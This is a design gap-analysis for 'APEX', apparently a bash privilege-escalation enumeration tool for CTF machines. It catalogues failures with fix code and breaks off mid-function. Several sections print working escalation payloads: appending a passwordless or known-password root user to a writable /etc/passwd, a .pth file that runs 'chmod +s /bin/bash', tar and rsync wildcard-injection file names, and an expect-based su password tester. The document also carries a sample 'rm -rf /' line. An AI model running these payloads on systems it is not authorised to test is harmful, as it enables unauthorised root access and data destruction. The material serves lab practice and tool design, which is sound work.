# APEX — Fresh Gap Analysis: Everything That Can Break
## Every Real Failure Point Found After Full Re-Read of All 10 Design Files

---

## HOW TO READ THIS FILE

Each gap has:
- SEVERITY: CRITICAL / HIGH / MEDIUM / LOW
- WHERE: which design file missed it or got it wrong
- PROBLEM: exact technical description of what breaks
- FIX: exact solution to implement

If a gap is CRITICAL: the tool WILL fail on real machines without the fix.
If HIGH: the tool misses significant attack surface.
If MEDIUM: false positives, noise, or edge case failures.
If LOW: polish issues, minor coverage gaps.

---

## CRITICAL GAPS (Tool Fails Without These)

---

### CRITICAL-1: safe_run() Double-Interpretation Shell Injection

**Where:** 02_ARCHITECTURE.md — safe_run() implementation
**Problem:**
```bash
# Current design:
result=$(timeout 10 bash -c "$cmd" </dev/null 2>/dev/null)

# This double-interprets $cmd.
# Example call:
safe_run "find / -name '*.conf' -exec grep -l 'password' {} \;"

# bash -c "find / -name '*.conf' -exec grep -l 'password' {} \;"
# Inner bash sees: find / -name *.conf (quotes stripped by outer bash first!)
# The \; is now interpreted differently
# Special characters in filenames or paths CORRUPT the command

# Worse example:
safe_run "strings /path/with spaces/binary"
# bash -c "strings /path/with spaces/binary"
# → Error: cannot open '/path/with': No such file
```

**Real impact:** Any check involving paths with spaces (common in CTF machines),
special characters in file names, or complex shell arguments SILENTLY FAILS.
The function returns empty output. The finding is missed. No error shown.

**Fix:**
```bash
safe_run() {
    local timeout_sec="${1:-10}"
    shift
    # Remaining args ARE the command and its arguments — no re-splitting
    # NEVER use bash -c "string" — use direct execution with array
    
    local result
    case "$TIMEOUT_CMD" in
        timeout)
            result=$(timeout "$timeout_sec" "$@" </dev/null 2>/dev/null)
            ;;
        "busybox timeout")
            result=$(busybox timeout "$timeout_sec" "$@" </dev/null 2>/dev/null)
            ;;
        none)
            local tmpfile
            tmpfile=$(mktemp "${APEX_TMP}/.safe_XXXXXX")
            "$@" </dev/null >"$tmpfile" 2>/dev/null &
            local bg_pid=$!
            ( sleep "$timeout_sec"; kill "$bg_pid" 2>/dev/null ) &
            local killer=$!
            wait "$bg_pid" 2>/dev/null
            kill "$killer" 2>/dev/null
            result=$(cat "$tmpfile")
            rm -f "$tmpfile"
            ;;
    esac
    printf '%s' "$result"
    return 0
}

# All callers change from:
safe_run "sudo -n -l"
# To:
safe_run 5 sudo -n -l
# Cleaner, no injection, args preserved exactly
```

---

### CRITICAL-2: Parallel Engine Output Race Condition

**Where:** 02_ARCHITECTURE.md — parallel execution model, 00_PRE_BUILD_QA.md Phase structure
**Problem:**
```
Engine 1 mapper functions run in parallel with &
Each writes findings to temp file when complete.
Engine 3 starts reading temp files as they appear.

Race condition:
  Engine 1 function writes 100-line findings file.
  Write is not atomic — it's a series of echo >> file calls.
  Engine 3 reads file mid-write.
  Engine 3 sees partial finding: "SUID /usr/bi" (truncated)
  Parsing fails silently. Finding lost.

Worse: Engine 1 has 12 parallel jobs.
       All 12 try to register_finding() simultaneously.
       register_finding() appends to APEX_FINDINGS global file.
       Two jobs append simultaneously: line interleaving corruption.
       "SUID|/usr/bin/custom|70" + "SUDO|/usr/bin/python3|93"
       Becomes: "SUID|/usr/bin/cuSTOM|70sudo|/usr/bin/python3|93"
       Engine 3 cannot parse. All findings lost.
```

**Fix:**
```bash
# Atomic finding registration using temp-then-rename:
register_finding() {
    local type="$1" path="$2" desc="$3" confidence="$4" lens="$5"
    
    # Each finding gets its own atomic file (no sharing, no race)
    local finding_id="${type}_${lens}_$$_$(date +%N)"
    local finding_file="${APEX_FINDINGS_DIR}/${finding_id}.finding"
    
    # Write to unique file — atomic at filesystem level
    printf '%s|%s|%s|%d|%s\n' "$type" "$path" "$desc" "$confidence" "$lens" \
        > "${finding_file}.tmp"
    mv "${finding_file}.tmp" "$finding_file"  # atomic rename
}

# Engine 3 reads all *.finding files, not a shared append file
collect_findings() {
    for f in "${APEX_FINDINGS_DIR}"/*.finding; do
        [ -f "$f" ] && cat "$f"
    done
}
```

---

### CRITICAL-3: Alpine /etc/periodic Cron Not Scanned

**Where:** 09_MASTER_CHECKLIST.md CRON section, 07_DETECTION_ENGINES.md Engine 1
**Problem:**
```
Alpine Linux uses /etc/periodic/ instead of /etc/cron.d/

/etc/periodic/
├── hourly/     ← scripts run every hour
├── daily/      ← scripts run daily
├── weekly/     ← scripts run weekly
└── monthly/    ← scripts run monthly

06_CROSS_PLATFORM_COMPATIBILITY.md documents this fact.
07_DETECTION_ENGINES.md Engine 1 checklist does NOT include /etc/periodic/
09_MASTER_CHECKLIST.md cron section does NOT check /etc/periodic/
03_ALL_VECTORS_AND_TRAPS.md cron vector does NOT mention /etc/periodic/

RESULT: On Alpine (very common for Docker containers — 40% of containerized HTB machines),
        the entire cron attack surface is invisible to APEX.
```

**Fix:** Add to all cron scan functions:
```bash
# Alpine/OpenRC cron locations
for period_dir in /etc/periodic/hourly /etc/periodic/daily \
                  /etc/periodic/weekly /etc/periodic/monthly; do
    [ -d "$period_dir" ] && {
        for script in "$period_dir"/*; do
            [ -f "$script" ] && {
                register_finding "CRON_PERIODIC" "$script" \
                    "Periodic script in $period_dir" 75 "cron_periodic"
                read_deeply "$script" 0
            }
        done
    }
done

# Also: fcron on some systems
[ -d /var/spool/fcron ] && \
    find /var/spool/fcron -type f 2>/dev/null | while read f; do
        register_finding "CRON_FCRON" "$f" "fcron entry" 75 "cron_fcron"
    done
```

---

### CRITICAL-4: Writable /etc/passwd Not Checked

**Where:** All files — this vector is completely absent
**Problem:**
```
If /etc/passwd is WRITABLE:
  - No shadow file needed
  - Add new root user: echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
  - su - hacker → instant root (no password because passwd field empty)
  - OR: openssl passwd -1 password → replace root's x → su root with our password

/etc/passwd writable is:
  - HTB Sunday (explicit machine based on this)
  - Various other machines with misconfigured permissions
  - VERY common in old/legacy systems

Current design only checks if /etc/shadow is READABLE.
Zero check for /etc/passwd being WRITABLE.
This is a 95% confidence vector — direct path to root.
```

**Fix:**
```bash
check_passwd_writable() {
    if [ -w /etc/passwd ]; then
        register_finding "WRITABLE_PASSWD" "/etc/passwd" \
            "CRITICAL: /etc/passwd writable — can add root user directly" \
            99 "passwd_write"
        # Generate exploit:
        local exploit
        exploit="echo 'r00t:\$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash' >> /etc/passwd && su - r00t"
        register_exploit "WRITABLE_PASSWD" "/etc/passwd" "$exploit"
    fi
    
    # Also check /etc/shadow writable (separate from readable)
    if [ -w /etc/shadow ]; then
        register_finding "WRITABLE_SHADOW" "/etc/shadow" \
            "CRITICAL: /etc/shadow writable — can replace root hash" \
            99 "shadow_write"
    fi
}
```

---

### CRITICAL-5: sudo -l Multi-Line Rule Parsing Failure

**Where:** 02_ARCHITECTURE.md detect_sudo(), 03_ALL_VECTORS_AND_TRAPS.md
**Problem:**
```bash
# sudo -l output can span multiple lines for complex rules:
User user may run the following commands on host:
    (ALL : ALL) NOPASSWD: /usr/bin/python3,
        /usr/bin/pip,
        /usr/bin/vim

# Current design: grep "NOPASSWD" | grep -oE '/[^ ,]+'
# This finds: /usr/bin/python3 (from line 1)
# MISSES: /usr/bin/pip, /usr/bin/vim (continuation lines)

# Real-world rule that breaks current parser:
(root) NOPASSWD: sudoedit /etc/nginx/sites-enabled/*
# The star wildcard is missed by /[^ ,]+ pattern (stops at space before *)

# Another breaking case:
(ALL) ALL
# grep for NOPASSWD misses this — no NOPASSWD keyword but still exploitable
# via sudo ALL (requires password but if we have it...)
```

**Fix:**
```bash
parse_sudo_rules() {
    local sudol="$1"
    
    # Join continuation lines (lines starting with whitespace after a NOPASSWD line)
    local normalized
    normalized=$(echo "$sudol" | awk '
        /NOPASSWD/ { printf "%s", $0; next }
        /^[[:space:]]+\// { printf " %s", $0; next }
        { print "" ; print $0 }
    ' | grep -v '^$')
    
    # Now parse full rules including continuations
    echo "$normalized" | grep "NOPASSWD" | grep -oE '(/[^ ,]+|\*[^ ,]*)' | while read cmd; do
        echo "NOPASSWD_CMD: $cmd"
    done
    
    # Also detect ALL (password required but noted for credential testing)
    echo "$normalized" | grep -E '\(ALL\).*ALL[^!]|PASSWD.*ALL' | grep -v "NOPASSWD" | \
        while read line; do
            echo "PASSWD_REQUIRED_ALL: $line"
        done
}
```

---

### CRITICAL-6: Immutable Files — find -writable False Positives

**Where:** 02_ARCHITECTURE.md write map, 03_ALL_VECTORS_AND_TRAPS.md
**Problem:**
```
find -writable reports based on permission bits only.
lsattr (chattr) immutable flag (+i) is NOT checked by find -writable.

A maker can:
  chmod 777 /etc/crontab    ← find -writable reports it as writable!
  chattr +i /etc/crontab    ← actually immutable — write fails with EPERM

Student (or APEX) thinks: "world-writable crontab! 99% confidence path!"
Runs: echo '* * * * * root bash -c "..."' >> /etc/crontab
Gets: bash: /etc/crontab: Operation not permitted
Time wasted: 20 minutes debugging "why doesn't my write work"

This is a REAL trap used in CTF machines.
```

**Fix:**
```bash
verify_actually_writable() {
    local filepath="$1"
    
    # Permission check first
    [ -w "$filepath" ] || return 1
    
    # Immutable flag check (requires lsattr from e2fsprogs)
    if command -v lsattr >/dev/null 2>&1; then
        local attrs
        attrs=$(lsattr "$filepath" 2>/dev/null | awk '{print $1}')
        echo "$attrs" | grep -q 'i' && {
            log_debug "IMMUTABLE: $filepath — find says writable but chattr +i set"
            return 1
        }
    fi
    
    # Actual write test (safest verification):
    local testfile="${filepath}.apex_wrtest_$$"
    if cp /dev/null "$testfile" 2>/dev/null; then
        rm -f "$testfile" 2>/dev/null
        return 0  # confirmed writable
    fi
    
    # Or for directories: touch a test file
    if [ -d "$filepath" ]; then
        local testentry="${filepath}/.apex_dirtest_$$"
        if touch "$testentry" 2>/dev/null; then
            rm -f "$testentry" 2>/dev/null
            return 0
        fi
        return 1
    fi
    
    return 1
}
```

---

## HIGH SEVERITY GAPS

---

### HIGH-1: Python .pth File Execution Model Misunderstood

**Where:** 01_PHILOSOPHY_AND_CORE_LOGIC.md, 02_ARCHITECTURE.md, 03_ALL_VECTORS_AND_TRAPS.md
**Problem:**
```
Design says: "writable .pth files allow code injection"

REALITY: .pth files have TWO modes:
  1. Lines starting with a regular path: just adds to sys.path (NO code execution)
     /opt/mylib           ← just adds path, safe
     
  2. Lines starting with "import ": executes as Python code
     import os; os.system("id")   ← EXECUTES on any python3 invocation
     
If APEX generates a .pth payload without the "import " prefix, it does NOTHING.
If student writes: echo '/tmp/evil' > site-packages/evil.pth → no code execution.
Must write: echo 'import os; os.system("chmod +s /bin/bash")' > site-packages/evil.pth

Also: .pth files are only processed in directories in sys.path at startup.
Writing to /tmp/evil.pth does NOTHING unless /tmp is in sys.path (it isn't by default).
Must write to actual site-packages directory.
```

**Fix:** Correct the exploit generation:
```bash
generate_pth_exploit() {
    local pth_dir="$1"
    # CORRECT payload format:
    local payload='import os; os.system("chmod +s /bin/bash")'
    # Requires 'import ' prefix to execute
    echo "EXPLOIT: echo '$payload' > ${pth_dir}/apex_pwn.pth"
    echo "VERIFY: python3 -c 'pass' && ls -la /bin/bash | grep 's'"
    echo "NOTE: 'import ' prefix required — bare path lines do NOT execute"
}
```

---

### HIGH-2: SUID Library Injection — Missing Load Path Analysis

**Where:** 02_ARCHITECTURE.md Engine 2, 03_ALL_VECTORS_AND_TRAPS.md Vector 2
**Problem:**
```
Design checks: is the .so file itself writable?
Design MISSES: is any DIRECTORY in the library load path writable?

Library loading order for SUID binary:
  1. Hardcoded RPATH in binary (readelf -d | grep RPATH)
  2. LD_LIBRARY_PATH (stripped for SUID binaries!)
  3. /etc/ld.so.cache (from /etc/ld.so.conf.d/*)
  4. /lib, /usr/lib, /lib64, /usr/lib64

If /etc/ld.so.conf.d/custom.conf contains "/opt/libs"
AND /opt/libs/ is writable by us
AND the SUID binary loads libcustom.so
→ Create /opt/libs/libcustom.so with malicious constructor
→ SUID binary loads it → root execution

Also missed: RPATH injection
  If SUID binary has RPATH=/opt/rpath (readable from readelf -d)
  AND /opt/rpath/ is writable
  → Place libany.so there with our constructor
  → Library loaded before all others (RPATH has priority)

Current deep reader checks ldd output for writable .so files.
It does NOT check /etc/ld.so.conf.d/* directories for writability.
It does NOT check RPATH for writability.
```

**Fix:**
```bash
check_suid_library_paths() {
    local binary="$1"
    
    # Check RPATH (highest priority, can't be disabled)
    if command -v readelf >/dev/null 2>&1; then
        readelf -d "$binary" 2>/dev/null | grep -E 'RPATH|RUNPATH' | \
        grep -oE '\[.*\]' | tr -d '[]' | tr ':' '\n' | while read rpath_dir; do
            [ -w "$rpath_dir" ] && register_finding "SUID_RPATH" "$binary" \
                "RPATH dir writable: $rpath_dir — place malicious .so here" 92 "suid_rpath"
        done
    fi
    
    # Check /etc/ld.so.conf.d/* directories
    find /etc/ld.so.conf.d/ -type f 2>/dev/null | while read conf; do
        grep -v '^#' "$conf" 2>/dev/null | while read libdir; do
            [ -d "$libdir" ] && [ -w "$libdir" ] && \
                register_finding "LD_CONF_WRITABLE_DIR" "$binary" \
                    "Library dir writable: $libdir (in $conf)" 88 "ld_conf"
        done
    done
}
```

---

### HIGH-3: su - Not in Credential Testing

**Where:** 03_ALL_VECTORS_AND_TRAPS.md Vector 9 Credential DNA
**Problem:**
```
Credential DNA tests found passwords against:
  SSH (port 22)
  MySQL root
  PostgreSQL
  Web app login

NOT tested:
  su - root      ← if we find root's password, su is the path
  su - user      ← lateral movement to another user
  
On machines where SSH is not running on localhost (or filtered),
su is the ONLY way to use a found root credential.
On machines requiring lateral movement (user1 → user2 → root),
su is the primary vector.
```

**Fix:**
```bash
test_credential_su() {
    local username="$1"
    local password="$2"
    
    # su requires a TTY — use expect or Python's pty module
    if command -v expect >/dev/null 2>&1; then
        local result
        result=$(expect -c "
            set timeout 5
            spawn su - $username
            expect \"Password:\"
            send \"$password\r\"
            expect {
                \"\\\$\" { puts \"SU_SUCCESS\" }
                \"#\" { puts \"SU_SUCCESS_ROOT\" }
                \"Authentication failure\" { puts \"SU_FAIL\" }
                timeout { puts \"SU_TIMEOUT\" }
            }
        " 2>/dev/null)
        echo "$result" | grep -q "SU_SUCCESS" && return 0
    fi
    
    # Python fallback:
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import pty, os, time
pid = os.fork()
if pid == 0:
    pty.spawn(['/bin/su', '-', '$username'])
" 2>/dev/null &
        # Note: automated su testing without expect is unreliable
        # Log as manual test if expect unavailable
        echo "MANUAL_TEST: su - $username (password: $password)"
    fi
}
```

---

### HIGH-4: Inline pspy Cannot Catch Fast Processes

**Where:** 02_ARCHITECTURE.md Layer 6 (pspy dynamic), 09_MASTER_CHECKLIST.md
**Problem:**
```
Design says: "Inline pspy: monitor /proc for 3 minutes"

REALITY of inline /proc polling:
  Real pspy uses inotify on /proc — instant notification on fork.
  Bash polling: ls /proc/[0-9]* every 1-2 seconds.
  
Problem 1: Process runs and exits in <1 second (fast cron, cleanup script).
           Bash poll misses it entirely. Never seen in output.
           
Problem 2: Process appears between polls.
           Bash records it in one poll but cmdline already gone.
           Returns empty cmdline. Finding logged as "PID 12345 []" — useless.
           
Problem 3: Polling consumes CPU. On slow machines, polling itself delays
           subsequent checks, creating longer blind windows.

Consequence: A cron job running every 2 minutes with a 5-second duration
             has a 95.8% chance of being MISSED by 2-second bash polling
             over a 3-minute window.
             (Only seen if poll happens to land in the 5-second window.)

The design says pspy is Layer 6. But inline bash pspy is not pspy — 
it's a probabilistic process observer with high miss rate.
```

**Fix — Prioritize real pspy, improve bash fallback:**
```bash
run_process_monitor() {
    local duration="${1:-180}"  # seconds
    
    # Priority 1: real pspy binary (download or pre-staged)
    local pspy_bin=""
    for candidate in /dev/shm/pspy64 /tmp/pspy64 /dev/shm/pspy32 /tmp/pspy32; do
        [ -x "$candidate" ] && { pspy_bin="$candidate"; break; }
    done
    
    if [ -n "$pspy_bin" ]; then
        safe_run "$duration" "$pspy_bin" -q -i 1000 | \
            grep "UID=0" > "${APEX_TMP}/pspy_output.txt" &
        PSPY_PID=$!
        return 0
    fi
    
    # Priority 2: inotifywait on /proc (better than polling)
    if command -v inotifywait >/dev/null 2>&1; then
        inotifywait -m -r /proc -e create 2>/dev/null | \
        grep -E '^/proc/[0-9]+' | while read dir event file; do
            local pid="${dir#/proc/}"
            pid="${pid%%/*}"
            [ -r "/proc/$pid/cmdline" ] && \
            [ -r "/proc/$pid/status" ] && {
                local uid cmd
                uid=$(grep "^Uid:" "/proc/$pid/status" 2>/dev/null | awk '{print $2}')
                cmd=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr '\0' ' ')
                [ "$uid" = "0" ] && echo "ROOT_PROC: $cmd" >> "${APEX_TMP}/pspy_output.txt"
            }
        done &
        PSPY_PID=$!
        return 0
    fi
    
    # Priority 3: Bash polling (with honest warning about miss rate)
    log_warn "pspy not found, inotifywait not found — using polling (HIGH MISS RATE)"
    log_warn "Download pspy64 to /dev/shm/pspy64 for reliable process monitoring"
    
    # Faster polling: every 0.3s instead of 1s (if bash sleep supports decimals)
    local known_pids=""
    local end_time=$(($(date +%s) + duration))
    while [ $(date +%s) -lt $end_time ]; do
        for pid_dir in /proc/[0-9]*/; do
            local pid="${pid_dir%/}"
            pid="${pid##*/}"
            echo "$known_pids" | grep -q ":$pid:" && continue
            known_pids="$known_pids:$pid:"
            if [ -r "/proc/$pid/status" ]; then
                local uid
                uid=$(grep "^Uid:" "/proc/$pid/status" 2>/dev/null | awk '{print $2}')
                if [ "${uid:-999}" -eq 0 ]; then
                    local cmd
                    cmd=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null)
                    [ -n "$cmd" ] && echo "ROOT_PROC: $cmd" >> "${APEX_TMP}/pspy_output.txt"
                fi
            fi
        done
        sleep 0.3 2>/dev/null || sleep 1
    done &
    PSPY_PID=$!
}
```

---

### HIGH-5: Cron PATH Override Per-Job Not Checked

**Where:** 03_ALL_VECTORS_AND_TRAPS.md Vector 3, 02_ARCHITECTURE.md Engine 2
**Problem:**
```
Design correctly finds writable directories in /etc/crontab PATH= variable.
Design MISSES: individual cron jobs can OVERRIDE the crontab PATH before their command.

Example:
/etc/crontab:
  PATH=/usr/local/bin:/usr/bin:/bin       ← /usr/local/bin writable!

* * * * * root PATH=/usr/sbin:/sbin /usr/local/bin/backup  ← PATH overridden!
* * * * * root /usr/local/bin/backup                       ← uses crontab PATH ✓

First job: our /usr/local/bin binary never called (PATH overridden to sysadmin-only)
Second job: our binary IS called (uses /usr/local/bin from crontab PATH)

Current parser checks crontab PATH= variable globally.
It does NOT check if individual job lines include their own PATH= prefix.
```

**Fix:**
```bash
parse_cron_job_with_path_override() {
    local job_line="$1"
    local crontab_path="$2"
    
    # Extract any per-job PATH override
    local job_path_override
    job_path_override=$(echo "$job_line" | grep -oE 'PATH=[^ ]+')
    
    local effective_path
    if [ -n "$job_path_override" ]; then
        effective_path="${job_path_override#PATH=}"
        log_debug "Job has PATH override: $effective_path (crontab PATH ignored)"
    else
        effective_path="$crontab_path"
    fi
    
    # Extract command (after timing fields and optional user field)
    local cmd
    cmd=$(echo "$job_line" | awk '{
        # Skip timing fields (5) + optional user field
        # Find first token that looks like a path or command
        for(i=1;i<=NF;i++) {
            if($i ~ /^[/a-zA-Z]/ && i > 5) { print $i; exit }
        }
    }')
    
    # Check PATH hijack only with the EFFECTIVE path (not global crontab PATH)
    echo "$effective_path" | tr ':' '\n' | while read pathdir; do
        [ -w "$pathdir" ] && echo "PATH_HIJACK_POSSIBLE: $cmd via $pathdir (effective path)"
    done
}
```

---

### HIGH-6: Wildcard Injection Coverage Incomplete

**Where:** 03_ALL_VECTORS_AND_TRAPS.md Vector 3 (only covers tar)
**Problem:**
```
Design covers: tar /path/* wildcard injection → --checkpoint flag injection

MISSING wildcard injection vectors:
  chown user:group /path/*
    → touch -- '--reference=/etc/shadow'
    → chown copies permissions FROM --reference file
    → not direct escalation but reveals shadow contents

  chmod 644 /path/*  
    → touch -- '--reference=evil'
    → chmod changes permissions of evil file based on reference

  rsync src/* dest/
    → touch -- '-e sh -c "payload" dummy'
    → rsync executes: sh -c "payload" as its rsync-path

  zip /backup.zip /path/*
    → touch -- '../../../etc/cron.d/evil'
    → zip may write outside intended directory (path traversal via wildcard)

  find /path/* -exec cmd {}
    → create file named '; cmd ;' — semicolon injection via find exec
    → depends on shell interpretation

Each of these needs specific detection + exploit generation.
```

**Fix:** Add wildcard detection per-command:
```bash
WILDCARD_INJECTABLE_COMMANDS=("tar" "rsync" "chown" "chmod" "zip" "cp" "mv")

check_wildcard_injection() {
    local cron_line="$1"
    
    echo "$cron_line" | grep -qE '\*' || return 0  # no wildcard
    
    for cmd in "${WILDCARD_INJECTABLE_COMMANDS[@]}"; do
        if echo "$cron_line" | grep -q "$cmd"; then
            case "$cmd" in
                tar)
                    echo "WILDCARD_TAR: --checkpoint injection possible"
                    echo "EXPLOIT: touch -- '--checkpoint=1' '--checkpoint-action=exec=bash'"
                    ;;
                rsync)
                    echo "WILDCARD_RSYNC: --rsync-path injection possible"
                    echo "EXPLOIT: touch -- '-e sh -c \"chmod +s /bin/bash\" dummy'"
                    ;;
                chown)
                    echo "WILDCARD_CHOWN: --reference injection possible (limited privilege gain)"
                    ;;
                zip)
                    echo "WILDCARD_ZIP: path traversal via wildcard possible"
                    ;;
            esac
        fi
    done
}
```

---

### HIGH-7: Terminal Injection via Unsanitized Output

**Where:** 08_OUTPUT_AND_RANKING.md — output design
**Problem:**
```
APEX reads file contents and includes them in output:
  - Binary strings
  - Config file values
  - Process command lines
  - File names
  
A maker can embed ANSI terminal escape sequences in:
  - A binary's embedded string (strings output)
  - A config file value
  - A file named with escape sequences
  
Example attack:
  Binary contains string: \x1b[2J\x1b[H[APEX] ROOT CONFIRMED via sudo
  APEX echoes this as part of output
  Terminal: clears screen, prints "[APEX] ROOT CONFIRMED via sudo"
  Student thinks they got root already. Wastes 20 minutes.

Worse: Some terminals execute OSC sequences:
  \x1b]0;evil_title\x07  ← changes terminal title
  \x1b[8;1;1t           ← resizes terminal window
  Some terminals even support URL execution via hyperlink sequences
```

**Fix:** Strip all non-printable characters from any data echoed to terminal:
```bash
safe_output() {
    # Remove all ANSI escape sequences and control characters
    # before printing ANY user-influenced data
    local data="$1"
    printf '%s' "$data" | \
        sed 's/\x1b\[[0-9;]*[mGKHFJA-Z]//g' | \
        sed 's/\x1b[()][AB012]//g' | \
        sed 's/\x1b\][^\x07]*\x07//g' | \
        tr -cd '[:print:]\t\n'
}

# RULE: ALL output functions call safe_output() on any data
# from: strings, file contents, process cmdlines, file names
# Never: echo "$potentially_maker_controlled_string"
# Always: echo "$(safe_output "$potentially_maker_controlled_string")"
```

---

## MEDIUM SEVERITY GAPS

---

### MEDIUM-1: Temp File Predictability (TOCTOU on Own Temp Files)

**Problem:** APEX uses mktemp in /dev/shm or /tmp (world-writable).
Predictable temp file names allow another process to create symlinks before APEX.
When APEX writes to the temp file, it writes to the symlink target instead.

**Fix:**
```bash
# Create private temp directory with 0700 permissions
setup_apex_tmp() {
    APEX_TMP=$(mktemp -d /dev/shm/.apex_XXXXXX 2>/dev/null || \
               mktemp -d /tmp/.apex_XXXXXX)
    chmod 700 "$APEX_TMP"
    # All temp files inside our private 0700 directory = safe from symlink attacks
}
```

---

### MEDIUM-2: Capabilities Hex Decode Wrong

**Where:** 06_CROSS_PLATFORM_COMPATIBILITY.md — decode_capabilities()
**Problem:**
```
/proc/$pid/status shows:
CapEff: 0000000000003000

Design decodes this for known caps.
Problem: The bit positions in the file are different from cap constants.

cap_setuid = bit 7 = value 0x80 (hex 80)
cap_net_admin = bit 12 = value 0x1000

If the code checks for cap_setuid by looking for "0x80" as a substring of
the hex string "0000000000003000" — this FAILS because 0x3000 contains 3000,
not 80. Need proper bitwise math.

Many bash implementations use string matching on the hex value
rather than actual bitwise AND — this produces wrong results.
```

**Fix:**
```bash
has_capability() {
    local cap_hex="$1"   # from /proc/PID/status CapEff field
    local cap_bit="$2"   # capability bit number (e.g., 7 for CAP_SETUID)
    
    # Convert hex to decimal and do bitwise AND
    local cap_decimal=$((16#${cap_hex}))
    local cap_mask=$((1 << cap_bit))
    
    [ $(( cap_decimal & cap_mask )) -ne 0 ]
}

# CAP constants (bit numbers):
CAP_SETUID=7
CAP_SETGID=6
CAP_SYS_ADMIN=21
CAP_NET_ADMIN=12
CAP_SYS_PTRACE=19
CAP_DAC_OVERRIDE=1
CAP_DAC_READ_SEARCH=2
CAP_CHOWN=0
CAP_NET_RAW=13

# Usage:
has_capability "$capeff_hex" "$CAP_SETUID" && echo "SETUID capability active"
```

---

### MEDIUM-3: Group Membership Check Misses Inherited Groups

**Problem:**
```
`id` shows current user's active groups.
But groups can be added after login — a user might have been added to 'docker'
group after their session started. `id` shows old group list.
`id` uses the kernel's group list for the current session.

More importantly: /etc/group may show the user in a group
that isn't in their current id output (if added after last login).
APEX should cross-reference /etc/group against the user's login name,
not just use `id` output.

Also: setgid() in a script can drop to a specific group.
If a script runs as us with setgid to a group we're NOT in via id,
but we have permission via /etc/group, we might be missing that.
```

**Fix:**
```bash
get_all_groups() {
    local username
    username=$(whoami)
    
    # Method 1: current kernel groups (may be stale)
    local kernel_groups
    kernel_groups=$(id -Gn 2>/dev/null | tr ' ' '\n')
    
    # Method 2: /etc/group membership (authoritative for next login)
    local etc_groups
    etc_groups=$(grep -E "[:,]${username}(,|$)" /etc/group 2>/dev/null | cut -d: -f1)
    
    # Combine both, deduplicate
    (echo "$kernel_groups"; echo "$etc_groups") | sort -u
    
    # If difference found: warn user to `newgrp <groupname>` to activate
    local new_groups
    new_groups=$(comm -13 <(echo "$kernel_groups" | sort) <(echo "$etc_groups" | sort))
    [ -n "$new_groups" ] && log_warn "Groups in /etc/group not in current session: $new_groups"
    log_warn "Run 'newgrp <group>' or re-login to activate these groups"
}
```

---

### MEDIUM-4: Deep Reader Misses Heredoc Content

**Problem:**
```bash
# A shell script containing:
cat > /tmp/privileged_script.sh << 'EOF'
#!/bin/bash
rm -rf /                 # (malicious content)
eval "$USER_INPUT"       # (injection point)
EOF
chmod +x /tmp/privileged_script.sh
/tmp/privileged_script.sh

# Current deep reader looks for: source, eval, commands without /
# It does NOT analyze heredoc content.
# The eval "$USER_INPUT" inside the heredoc is completely invisible to the reader.
# The file written by heredoc may also be writable if written to /tmp/
```

**Fix:** Deep reader must detect heredoc patterns and extract content:
```bash
extract_heredoc_content() {
    local script="$1"
    # Find heredocs: << 'MARKER' or <<MARKER
    grep -n "<<" "$script" 2>/dev/null | while read line; do
        local lineno marker content
        lineno=$(echo "$line" | cut -d: -f1)
        marker=$(echo "$line" | grep -oE "<<[-]?['\"]?[A-Z_a-z0-9]+" | tr -d "'\"<-")
        # Extract heredoc body
        content=$(awk "/^${marker}$/{found=0} found{print} /<<.*${marker}/{found=1}" \
                      "$script" 2>/dev/null)
        # Analyze the heredoc content as if it were a script
        analyze_script_fragment "$content" "$script" "$lineno"
    done
}
```

---

### MEDIUM-5: No Check for Writable /etc/environment or /etc/profile.d/

**Problem:**
```
/etc/environment: read by PAM on login, sets environment for ALL users.
  If writable: add LD_PRELOAD=/our/lib.so → loads on every PAM-authenticated action.
  Specifically: LD_PRELOAD in /etc/environment affects sudo, su, login, ssh.

/etc/profile.d/*.sh: sourced by bash login shells for all users.
  If writable: add command → executes when any user logs in.
  If root logs in via cron job using bash login shell → root code execution.

/etc/bash.bashrc: sourced by all interactive bash shells.
  If writable: inject command → executes on any bash invocation.

/etc/ld.so.preload: design covers this (CRITICAL priority).
But /etc/environment and /etc/profile.d/ are NOT checked.
```

**Fix:**
```bash
check_global_env_files() {
    local targets=(
        "/etc/environment"
        "/etc/profile"
        "/etc/bash.bashrc"
        "/etc/zsh/zshenv"
        "/etc/zsh/zshrc"
    )
    
    for t in "${targets[@]}"; do
        [ -w "$t" ] && register_finding "WRITABLE_GLOBAL_ENV" "$t" \
            "Global environment file writable — affects all user sessions" 87 "global_env"
    done
    
    # profile.d directory: check each file
    for f in /etc/profile.d/*.sh; do
        [ -w "$f" ] && register_finding "WRITABLE_PROFILE_D" "$f" \
            "profile.d script writable — executes on login" 82 "profile_d"
    done
    
    # Check if profile.d DIRECTORY is writable (can add new scripts)
    [ -w "/etc/profile.d" ] && register_finding "WRITABLE_PROFILE_D_DIR" "/etc/profile.d" \
        "profile.d directory writable — can add malicious login script" 85 "profile_d_dir"
}
```

---

### MEDIUM-6: No Lateral Movement Analysis (User → User → Root)

**Problem:**
```
APEX assumes: current_user → root
Reality of many machines: current_user → intermediate_user → root

Example (HTB Previse):
  www-data → access /var/backup/accounts.py (readable by www-data group)
  accounts.py contains password for user 'm4lwhere'
  m4lwhere can run specific sudo → root

APEX current flow:
  1. Check current user's sudo → nothing for www-data
  2. Check current user's groups → nothing for www-data
  3. Check writable files → finds accounts.py
  4. READS accounts.py → finds password string
  5. Credential DNA: tests password on services
  6. If m4lwhere account exists AND SSH running → finds SSH login
  7. BUT: APEX doesn't THEN run full PrivEsc analysis AS m4lwhere

Gap: APEX finds the lateral credential but doesn't predict that
     m4lwhere has the sudo path to root.
     Student must manually: ssh in as m4lwhere, run APEX again.
     
APEX should: when credential found for local user, 
             read that user's sudo rules from /etc/sudoers
             (may be readable even if sudo -l isn't)
             and predict: "If you get m4lwhere, run: sudo [X]"
```

**Fix:**
```bash
predict_lateral_path() {
    local target_user="$1"
    
    # Check sudoers for target user's potential rules
    if [ -r /etc/sudoers ]; then
        grep "^$target_user\|^%[^ ]* " /etc/sudoers 2>/dev/null | \
            grep -i "nopasswd\|ALL" | while read rule; do
                register_finding "LATERAL_SUDO" "$target_user" \
                    "If you become $target_user: $rule" 70 "lateral_predict"
            done
    fi
    
    # Check if target user owns any interesting files
    find / -user "$target_user" -perm -4000 2>/dev/null | head -5 | while read f; do
